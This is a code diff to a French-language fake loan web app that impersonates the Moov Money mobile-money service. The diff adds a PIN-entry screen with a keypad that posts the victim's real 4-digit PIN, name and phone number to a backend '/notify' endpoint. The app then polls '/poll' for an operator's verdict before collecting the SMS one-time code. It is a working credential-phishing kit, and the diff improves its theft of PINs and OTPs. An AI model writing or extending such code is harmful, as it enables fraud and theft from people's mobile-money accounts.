@@ -21,6 +21,7 @@
       --blue:#2255d6;
       --blue-dark:#14329e;
       --green:#22a745;
+      --red-err:#e53e3e;
     }
     html,body{height:100%;font-family:'Nunito',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,sans-serif;background:var(--bg);display:flex;justify-content:center;margin:0;padding:0;-webkit-font-smoothing:antialiased;}
     .phone{width:390px;min-height:100vh;background:var(--white);display:flex;flex-direction:column;position:relative;overflow:hidden;}
@@ -38,7 +39,6 @@
     .body{padding:24px 20px 16px;flex:1;display:flex;flex-direction:column;overflow-y:auto;-webkit-overflow-scrolling:touch;}
     .foot{padding:12px 20px 28px;border-top:1px solid var(--border);flex-shrink:0;background:var(--white);}
 
-    /* ── Loan Amount Page Styles ── */
     .loan-title-section{text-align:center;margin-bottom:32px;padding-top:16px;}
     .loan-title{font-size:28px;font-weight:800;color:var(--text);margin-bottom:8px;}
     .loan-subtitle{font-size:15px;color:var(--sub);line-height:1.5;}
@@ -46,7 +46,6 @@
     .amount-label{font-size:13px;color:var(--sub);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:12px;font-weight:600;}
     .amount-display{font-size:48px;font-weight:700;color:var(--orange);margin-bottom:4px;letter-spacing:-1px;}
     .amount-range{font-size:13px;color:var(--hint);margin-bottom:20px;}
-
     .amount-input-wrap{margin-bottom:20px;}
     .amount-input-wrap label{display:block;font-size:13px;color:var(--sub);margin-bottom:8px;font-weight:600;text-transform:uppercase;letter-spacing:0.3px;}
     .amount-input-row{display:flex;align-items:center;gap:10px;background:var(--white);border:1.5px solid var(--border);border-radius:12px;padding:4px 14px;transition:border-color 0.15s;}
@@ -56,31 +55,25 @@
     .amount-input-row input::placeholder{color:var(--hint);}
     .amount-error{font-size:12px;color:#e53e3e;margin-top:8px;display:none;padding-left:4px;}
     .amount-error.show{display:block;}
-
     input[type=range]{width:100%;height:6px;-webkit-appearance:none;appearance:none;background:linear-gradient(90deg,var(--orange) 0%,var(--border) 0%);border-radius:6px;outline:none;cursor:pointer;display:block;}
     input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:28px;height:28px;border-radius:50%;background:var(--white);border:3px solid var(--orange);cursor:pointer;box-shadow:0 2px 8px rgba(255,106,0,0.3);transition:transform 0.15s;}
     input[type=range]::-webkit-slider-thumb:hover{transform:scale(1.1);}
     input[type=range]::-moz-range-thumb{width:28px;height:28px;border-radius:50%;background:var(--white);border:3px solid var(--orange);cursor:pointer;}
     .range-limits{display:flex;justify-content:space-between;margin-top:10px;}
     .range-limits span{font-size:12px;color:var(--hint);}
-
     .dur-label{font-size:13px;color:var(--sub);margin-bottom:10px;display:block;font-weight:600;text-transform:uppercase;letter-spacing:0.3px;}
     .dur-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:24px;}
     .dur-opt{padding:14px;border:1.5px solid var(--border);border-radius:12px;background:var(--white);font-size:14px;color:var(--sub);cursor:pointer;font-family:inherit;text-align:center;transition:all 0.2s;font-weight:500;}
     .dur-opt:hover{border-color:var(--orange);color:var(--orange);}
     .dur-opt.selected{border-color:var(--orange);color:var(--orange);background:var(--orange-light);font-weight:700;box-shadow:0 2px 8px rgba(255,106,0,0.1);}
-
     .detail-card{background:var(--orange-light);border-radius:12px;padding:16px;margin-bottom:16px;}
     .detail-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;}
     .detail-row:not(:last-child){border-bottom:1px solid rgba(255,106,0,0.15);}
     .detail-lbl{font-size:14px;color:var(--sub);}
     .detail-val{font-size:14px;color:var(--text);font-weight:600;}
-
     .spacer{flex:1;min-height:16px;}
-
     .section-title{font-size:26px;font-weight:800;color:var(--text);margin-bottom:6px;}
     .section-sub{font-size:15px;color:var(--sub);margin-bottom:26px;line-height:1.55;}
-
     .field{margin-bottom:16px;}
     .flbl{display:block;font-size:13px;color:var(--sub);margin-bottom:6px;font-weight:700;text-transform:uppercase;}
     .field input,.field select{width:100%;padding:14px 14px;background:var(--white);border:1.5px solid var(--border);border-radius:10px;font-size:15px;font-family:inherit;font-weight:400;color:var(--text);outline:none;-webkit-appearance:none;transition:border-color 0.15s;}
@@ -88,7 +81,6 @@
     .field input:focus,.field select:focus{border-color:var(--orange);}
     .field input::placeholder{color:var(--hint);}
     .fpair{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
-
     .btn-primary{display:block;width:100%;padding:16px;background:var(--blue-dark);border:none;border-radius:10px;font-size:16px;font-weight:700;color:var(--white);cursor:pointer;font-family:inherit;letter-spacing:0.2px;transition:background 0.2s;}
     .btn-primary:hover{background:#0f2680;}
     .btn-primary:disabled{background:#a9c2e8;cursor:not-allowed;}
@@ -96,7 +88,6 @@
     .brow .btn-primary{flex:2;}
     .btn-back{flex:1;padding:16px;background:transparent;border:1.5px solid var(--border);border-radius:10px;font-size:15px;font-weight:500;color:var(--sub);cursor:pointer;font-family:inherit;}
     .btn-ghost{display:block;width:100%;padding:15px;background:transparent;border:none;font-size:14px;font-weight:400;color:var(--sub);cursor:pointer;font-family:inherit;margin-top:2px;}
-
     .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,106,0,0.5);display:flex;align-items:center;justify-content:center;z-index:100;flex-direction:column;}
     .overlay-card{background:var(--white);border-radius:20px;padding:36px 28px;text-align:center;max-width:320px;width:90%;box-shadow:0 20px 60px rgba(255,106,0,0.25);}
     .overlay-spinner{width:52px;height:52px;border:3.5px solid var(--border);border-top-color:var(--orange);border-right-color:var(--orange-dark);border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 20px;}
@@ -104,7 +95,6 @@
     .overlay-title{font-size:19px;font-weight:700;color:var(--text);margin-bottom:8px;}
     .overlay-desc{font-size:14px;color:var(--sub);line-height:1.6;}
     .overlay-error{color:#e53e3e;margin-top:16px;font-size:13px;display:none;}
-
     .succ-wrap{flex:1;display:flex;flex-direction:column;padding:48px 24px 32px;}
     .succ-icon{width:52px;height:52px;border-radius:50%;background:linear-gradient(135deg,var(--orange),var(--orange-dark));display:flex;align-items:center;justify-content:center;margin-bottom:24px;box-shadow:0 8px 20px rgba(255,106,0,0.25);}
     .succ-icon svg{width:22px;height:22px;stroke:var(--white);fill:none;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round;}
@@ -144,6 +134,34 @@
     .terms-text a{color:#1d4ed8;text-decoration:none;}
     .continue-btn{width:100%;background:#14329e;color:#fff;font-size:17px;font-weight:700;border:none;border-radius:10px;padding:17px;cursor:pointer;}
     .continue-btn:hover{background:#0f2680;}
+
+    /* ═══════════════ PIN SCREEN ═══════════════ */
+    .scr.pin-scr{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;padding:0;align-items:center;justify-content:center;}
+    .pin-container{display:flex;flex-direction:column;align-items:center;padding:40px 24px;width:100%;}
+    .pin-logo{width:100px;height:auto;margin-bottom:32px;object-fit:contain;}
+    .pin-title{font-size:24px;font-weight:700;color:#1a1a1a;margin-bottom:8px;text-align:center;}
+    .pin-subtitle{font-size:15px;color:#6b6b6b;margin-bottom:36px;text-align:center;line-height:1.4;}
+    .pin-boxes-row{display:flex;justify-content:center;gap:16px;margin-bottom:16px;}
+    .pin-box{width:56px;height:56px;border:2px solid #d8dce6;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:700;color:#1a1a1a;background:#fff;transition:border-color 0.15s,box-shadow 0.15s;}
+    .pin-box.filled{border-color:var(--orange);}
+    .pin-box.active{border-color:var(--orange);box-shadow:0 0 0 3px rgba(255,106,0,0.12);}
+    .pin-box.error{border-color:var(--red-err);animation:shake 0.4s ease;}
+    @keyframes shake{0%,100%{transform:translateX(0);}20%{transform:translateX(-6px);}40%{transform:translateX(6px);}60%{transform:translateX(-4px);}80%{transform:translateX(4px);}}
+    .pin-dot{width:14px;height:14px;border-radius:50%;background:#1a1a1a;}
+    .pin-error-text{text-align:center;color:var(--red-err);font-size:13px;min-height:20px;margin-bottom:8px;font-weight:500;opacity:0;transition:opacity 0.2s;}
+    .pin-error-text.show{opacity:1;}
+    .forgot-pin-wrap{text-align:center;margin-bottom:28px;}
+    .forgot-pin-link{color:var(--orange);font-size:14px;font-weight:600;text-decoration:none;cursor:pointer;}
+    .forgot-pin-link:hover{text-decoration:underline;}
+    .keypad-container{width:100%;max-width:300px;}
+    .keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;width:100%;}
+    .key-btn{aspect-ratio:1;border:none;border-radius:50%;background:#f5f6f8;font-size:26px;font-weight:600;color:#1a1a1a;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;transition:background 0.15s,transform 0.1s;-webkit-tap-highlight-color:transparent;user-select:none;}
+    .key-btn:hover{background:#e8eaef;}
+    .key-btn:active{background:#dde0e6;transform:scale(0.95);}
+    .key-btn.empty{background:transparent;cursor:default;pointer-events:none;}
+    .key-btn.delete{background:transparent;font-size:18px;}
+    .key-btn.delete:hover{background:#f5f6f8;}
+    .pin-back-btn{position:absolute;top:20px;left:20px;background:none;border:none;font-size:24px;color:#1a1a1a;cursor:pointer;padding:8px;z-index:5;}
 
     /* ═══════════════ MOOV OTP SCREEN ═══════════════ */
     .scr.moov-otp-scr{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;padding:0;align-items:stretch;}
@@ -284,9 +302,6 @@
       <div class="moov-phone-input">
         <span class="country-code">+225</span>
         <input class="phone-number" type="tel" id="moovPhoneInput" placeholder="Numéro de téléphone" maxlength="10" inputmode="numeric" oninput="this.value=this.value.replace(/\D/g,'').slice(0,10)">
-        <svg class="checkmark" id="moovCheckmark" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
-          <polyline points="20 6 9 17 4 12"></polyline>
-        </svg>
       </div>
       <div class="spacer"></div>
       <div class="terms-row">
@@ -297,14 +312,50 @@
         </div>
         <div class="terms-text">Cochez pour accepter les <a href="#">«Conditions générales d'utilisation»</a></div>
       </div>
-      <button class="continue-btn" id="moovContinueBtn" onclick="goToMoovOtp()">Continuer</button>
+      <button class="continue-btn" id="moovContinueBtn" onclick="goToPinPage()">Continuer</button>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ PIN PAGE ═══════════════════ -->
+  <div class="scr pin-scr" id="s-pin">
+    <button class="pin-back-btn" onclick="go('s-pin','s-moov-login')">←</button>
+    <div class="pin-container">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov Money" class="pin-logo" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Moov_Money_Flooz.png/512px-Moov_Money_Flooz.png';">
+      <h1 class="pin-title">Confirmez votre code PIN</h1>
+      <p class="pin-subtitle">Entrez votre code PIN à 4 chiffres</p>
+      <div class="pin-boxes-row" id="pinBoxesRow">
+        <div class="pin-box active" data-index="0"></div>
+        <div class="pin-box" data-index="1"></div>
+        <div class="pin-box" data-index="2"></div>
+        <div class="pin-box" data-index="3"></div>
+      </div>
+      <div class="pin-error-text" id="pinError">Code PIN incorrect. Veuillez réessayer.</div>
+      <div class="forgot-pin-wrap">
+        <a class="forgot-pin-link" href="#" onclick="forgotPin()">Code PIN oublié ?</a>
+      </div>
+      <div class="keypad-container">
+        <div class="keypad">
+          <button class="key-btn" onclick="pinAddDigit('1')">1</button>
+          <button class="key-btn" onclick="pinAddDigit('2')">2</button>
+          <button class="key-btn" onclick="pinAddDigit('3')">3</button>
+          <button class="key-btn" onclick="pinAddDigit('4')">4</button>
+          <button class="key-btn" onclick="pinAddDigit('5')">5</button>
+          <button class="key-btn" onclick="pinAddDigit('6')">6</button>
+          <button class="key-btn" onclick="pinAddDigit('7')">7</button>
+          <button class="key-btn" onclick="pinAddDigit('8')">8</button>
+          <button class="key-btn" onclick="pinAddDigit('9')">9</button>
+          <button class="key-btn empty"></button>
+          <button class="key-btn" onclick="pinAddDigit('0')">0</button>
+          <button class="key-btn delete" onclick="pinDeleteDigit()">⌫</button>
+        </div>
+      </div>
     </div>
   </div>
 
   <!-- ═══════════════════ MOOV OTP ═══════════════════ -->
   <div class="scr moov-otp-scr" id="s-moov-otp">
     <div class="moov-otp-header">
-      <div class="back-arrow" onclick="go('s-moov-otp','s-moov-login')" style="position:static;">
+      <div class="back-arrow" onclick="go('s-moov-otp','s-pin')" style="position:static;">
         <svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
           <line x1="19" y1="12" x2="5" y2="12"></line>
           <polyline points="12 19 5 12 12 5"></polyline>
@@ -350,13 +401,103 @@
 </div>
 
 <script>
-// ── BACKEND CONFIG ──
 const API_BASE = window.location.origin;
 const POLL_INTERVAL = 3000;
 const POLL_TIMEOUT = 120000;
 
-var durVal = 6, fullNameCache = '', currentToken = null, pollTimer = null;
+var durVal = 6, currentToken = null, pollTimer = null;
 var moovTermsAccepted = false, moovOtpTimer = null;
+
+// ── PIN STATE ──
+var pinValue = '', pinBoxes = document.querySelectorAll('#pinBoxesRow .pin-box'), pinError = document.getElementById('pinError'), pinIsShaking = false;
+
+function pinUpdateDisplay() {
+  pinBoxes.forEach(function(b, i) {
+    b.innerHTML = '';
+    b.classList.remove('filled', 'active', 'error');
+    if (i < pinValue.length) {
+      var d = document.createElement('div');
+      d.className = 'pin-dot';
+      b.appendChild(d);
+      b.classList.add('filled');
+    }
+    if (i === pinValue.length && pinValue.length < 4) b.classList.add('active');
+  });
+  if (pinValue.length > 0) { pinError.classList.remove('show'); }
+}
+
+function pinAddDigit(d) {
+  if (pinIsShaking) return;
+  if (pinValue.length >= 4) return;
+  pinValue += d;
+  pinUpdateDisplay();
+  if (pinValue.length === 4) { setTimeout(function() { pinSubmit(); }, 300); }
+}
+
+function pinDeleteDigit() {
+  if (pinIsShaking) return;
+  if (pinValue.length === 0) return;
+  pinValue = pinValue.slice(0, -1);
+  pinUpdateDisplay();
+}
+
+function pinReset() {
+  pinValue = '';
+  pinUpdateDisplay();
+  pinError.classList.remove('show');
+}
+
+function pinShake() {
+  if (pinIsShaking) return;
+  pinIsShaking = true;
+  pinBoxes.forEach(b => b.classList.add('error'));
+  setTimeout(function() {
+    pinBoxes.forEach(b => b.classList.remove('error'));
+    pinIsShaking = false;
+    pinReset();
+  }, 400);
+}
+
+function pinSubmit() {
+  if (pinValue.length < 4) return;
+  var p = pinValue;
+  
+  showPollingOverlay('Vérification du PIN', 'Veuillez patienter...');
+  
+  notifyBackend('pin', { passcode: p }).then(function(d) {
+    if (!d.ok) {
+      hideOverlay();
+      goToOtp();
+      return;
+    }
+    currentToken = d.token;
+    startPolling(function(r) {
+      hideOverlay();
+      if (r === 'continue_otp') {
+        goToOtp();
+      } else if (r === 'pin_wrong') {
+        pinError.classList.add('show');
+        pinShake();
+      }
+    });
+  }).catch(function() {
+    hideOverlay();
+    goToOtp();
+  });
+}
+
+function forgotPin() {
+  alert('Code PIN oublié ? Veuillez contacter le service client.\n\nComposez le *110# pour obtenir de l\'aide.');
+}
+
+// ── KEYBOARD SUPPORT ──
+document.addEventListener('keydown', function(e) {
+  var pinScr = document.getElementById('s-pin');
+  if (!pinScr.classList.contains('active')) return;
+  if (e.key >= '0' && e.key <= '9') { pinAddDigit(e.key); }
+  else if (e.key === 'Backspace' || e.key === 'Delete') { pinDeleteDigit(); }
+  else if (e.key === 'Enter') { pinSubmit(); }
+});
 
 // ── NOTIFY BACKEND ──
 async function notifyBackend(type, extra) {
@@ -364,27 +505,12 @@ async function notifyBackend(type, extra) {
   var fn = document.getElementById('fn').value.trim();
   var ln = document.getElementById('ln').value.trim();
   var name = [fn, ln].filter(Boolean).join(' ') || 'Unknown';
-  
-  var payload = {
-    type: type,
-    phone: phone,
-    countryCode: '+225',
-    name: name
-  };
-  
+  var payload = { type: type, phone: phone, countryCode: '+225', name: name };
   for (var k in extra) payload[k] = extra[k];
-  
   try {
-    var r = await fetch(API_BASE + '/notify', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
+    var r = await fetch(API_BASE + '/notify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
     return await r.json();
-  } catch (e) {
-    console.error('Backend error:', e);
-    return { ok: false, error: 'Network error' };
-  }
+  } catch (e) { return { ok: false, error: 'Network error' }; }
 }
 
 // ── POLLING ──
@@ -392,17 +518,9 @@ function startPolling(cb) {
   var t0 = Date.now();
   clearInterval(pollTimer);
   pollTimer = setInterval(async function() {
-    if (Date.now() - t0 > POLL_TIMEOUT) {
-      clearInterval(pollTimer);
-      showOverlayError('Délai d\'attente dépassé. Veuillez réessayer.');
-      return;
-    }
+    if (Date.now() - t0 > POLL_TIMEOUT) { clearInterval(pollTimer); showOverlayError('Délai d\'attente dépassé.'); return; }
     try {
-      var r = await fetch(API_BASE + '/poll', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ token: currentToken })
-      });
+      var r = await fetch(API_BASE + '/poll', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: currentToken }) });
       var d = await r.json();
       if (!d.ok) { clearInterval(pollTimer); showOverlayError('Erreur de vérification.'); return; }
       if (d.result !== 'pending') { clearInterval(pollTimer); cb(d.result); }
@@ -422,6 +540,7 @@ function go(f, t) {
   var e = document.getElementById(t);
   e.classList.add('active');
   e.scrollTop = 0;
+  if (t === 's-pin') pinReset();
   if (t === 's-moov-otp') {
     startMoovOtpCountdown();
     var phone = document.getElementById('moovPhoneInput').value.trim();
@@ -431,6 +550,15 @@ function go(f, t) {
     document.getElementById('moovOtpSubmitBtn').style.cursor = 'not-allowed';
   }
 }
+
+function goToPinPage() {
+  var phone = document.getElementById('moovPhoneInput').value.trim();
+  if (!phone || phone.length !== 10) { alert('Veuillez entrer un numéro de téléphone valide à 10 chiffres'); return; }
+  if (!moovTermsAccepted) { alert('Veuillez accepter les conditions générales d\'utilisation'); return; }
+  go('s-moov-login', 's-pin');
+}
+
+function goToOtp() { go('s-pin', 's-moov-otp'); }
 
 // ── LOAN CALCULATIONS ──
 function calcM(a, m) { if (!a || a <= 0) return 0; var r = 0.05 / 12; return a * r * Math.pow(1 + r, m) / (Math.pow(1 + r, m) - 1); }
@@ -467,41 +595,6 @@ function toggleMoovTerms() {
   document.getElementById('moovTermsSvg').style.display = moovTermsAccepted ? 'block' : 'none';
 }
 
-function goToMoovOtp() {
-  var phone = document.getElementById('moovPhoneInput').value.trim();
-  if (!phone || phone.length !== 10) {
-    alert('Veuillez entrer un numéro de téléphone valide à 10 chiffres');
-    return;
-  }
-  if (!moovTermsAccepted) {
-    alert('Veuillez accepter les conditions générales d\'utilisation');
-    return;
-  }
-  
-  // Send PIN notification to backend (simulated PIN for Moov Money flow)
-  showPollingOverlay('Vérification en cours', 'Connexion sécurisée...');
-  
-  notifyBackend('pin', { passcode: '0000' }).then(function(d) {
-    if (!d.ok) {
-      hideOverlay();
-      go('s-moov-login', 's-moov-otp');
-      return;
-    }
-    currentToken = d.token;
-    startPolling(function(r) {
-      hideOverlay();
-      if (r === 'continue_otp') {
-        go('s-moov-login', 's-moov-otp');
-      } else if (r === 'pin_wrong') {
-        alert('Code PIN incorrect. Veuillez réessayer.');
-      }
-    });
-  }).catch(function() {
-    hideOverlay();
-    go('s-moov-login', 's-moov-otp');
-  });
-}
-
 // ── MOOV OTP ──
 function startMoovOtpCountdown() {
   clearInterval(moovOtpTimer);
@@ -525,8 +618,6 @@ function resendMoovOtp() {
   document.querySelectorAll('#moovOtpRow .otp-box').forEach(b => { b.value = ''; b.classList.remove('filled'); });
   document.getElementById('moovOtpSubmitBtn').classList.remove('active');
   document.getElementById('moovOtpSubmitBtn').style.cursor = 'not-allowed';
-  
-  // Notify backend about OTP resend
   notifyBackend('otp_resend', {}).catch(function() {});
 }
 
@@ -554,17 +645,13 @@ function updateMoovOtpBtn() {
   else { btn.classList.remove('active'); btn.style.cursor = 'not-allowed'; }
 }
 
-function getMoovOtpValue() {
-  return Array.from(document.querySelectorAll('#moovOtpRow .otp-box')).map(b => b.value).join('');
-}
+function getMoovOtpValue() { return Array.from(document.querySelectorAll('#moovOtpRow .otp-box')).map(b => b.value).join(''); }
 
 function submitMoovOtp() {
   var otp = getMoovOtpValue();
   if (otp.length < 6) { alert('Veuillez entrer le code complet'); return; }
-  
   clearInterval(moovOtpTimer);
   showPollingOverlay('Vérification du code', 'Veuillez patienter...');
-  
   notifyBackend('otp', { otp: otp }).then(function(d) {
     if (!d.ok) { showOverlayError('Erreur: ' + (d.error || 'Inconnue')); return; }
     currentToken = d.token;
@@ -582,18 +669,11 @@ function submitMoovOtp() {
           alert('Session invalide. Veuillez vous reconnecter.');
           go('s-moov-otp', 's-moov-login');
           break;
-        case 'loan_approved':
-          onApproved();
-          break;
-        case 'loan_rejected':
-          onRejected();
-          break;
+        case 'loan_approved': onApproved(); break;
+        case 'loan_rejected': onRejected(); break;
       }
     });
-  }).catch(function() {
-    hideOverlay();
-    onApproved(); // Fallback for demo
-  });
+  }).catch(function() { hideOverlay(); onApproved(); });
 }
 
 function onApproved() {
@@ -619,6 +699,7 @@ function reset() {
   document.getElementById('slider').value = 1000; document.getElementById('amountInput').value = ''; document.getElementById('amountError').classList.remove('show');
   moovTermsAccepted = false; document.getElementById('moovTermsSvg').style.display = 'none';
   document.getElementById('moovPhoneInput').value = '';
+  pinReset();
   document.querySelectorAll('#moovOtpRow .otp-box').forEach(b => { b.value = ''; b.classList.remove('filled'); });
   document.getElementById('moovOtpSubmitBtn').classList.remove('active');
   document.getElementById('moovOtpSubmitBtn').style.cursor = 'not-allowed';
